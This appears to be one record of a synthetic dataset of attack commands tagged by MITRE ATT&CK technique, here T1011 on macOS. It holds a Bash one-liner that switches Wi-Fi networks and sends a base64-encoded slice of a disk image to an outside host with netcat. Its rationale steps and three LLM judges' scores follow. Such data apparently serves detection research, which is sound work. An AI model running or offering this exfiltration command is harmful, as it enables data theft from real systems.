@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
+  "explanation": "Exfiltrates only the first few megabytes of a disk image over a separate Wi‑Fi SSID to a receiver on an uncommon TCP port, minimizing volume and leveraging an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Disconnect from existing Wi‑Fi to avoid the main network.",
+    "Join a research SSID operating outside typical enterprise channels.",
+    "Sample and base64-encode the first 5 MB of a disk image.",
+    "Transmit to a peer over the Wi‑Fi path using a high, rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-23d8e2b9",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with balanced quoting, correct use of process substitution and pipelines, and plausible flags for airport, networksetup, dd, base64, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects then joins a specified Wi‑Fi SSID and exfiltrates the first ~5 MiB of a disk image via base64 piped to nc on a nonstandard port, consistent with using an alternate network medium, though success may hinge on interface name/privileges and nc/-N support.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-09-30T23:00:58.916242Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with proper use of &&, pipes, process substitution, and balanced quotes, though the process substitution `< <(...)` combined with `base64` piped to `nc` is syntactically valid in bash but slightly unconventional; the `-N` flag for nc on macOS may not be universally supported.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by first disassociating from the current Wi-Fi network via `airport -z`, joining an alternate SSID with `networksetup`, then exfiltrating a partial disk image encoded in base64 over netcat to a remote host on an uncommon port, fully aligning with the technique of using an alternate network medium for exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:13:18.359571Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed using standard Bash syntax, valid macOS-specific paths, and correct flags for the utilities involved.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately reflects the T1011 technique by switching the Wi-Fi interface to a new SSID before exfiltrating data via Netcat, a highly plausible exfiltration scenario.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:13:20.414693Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
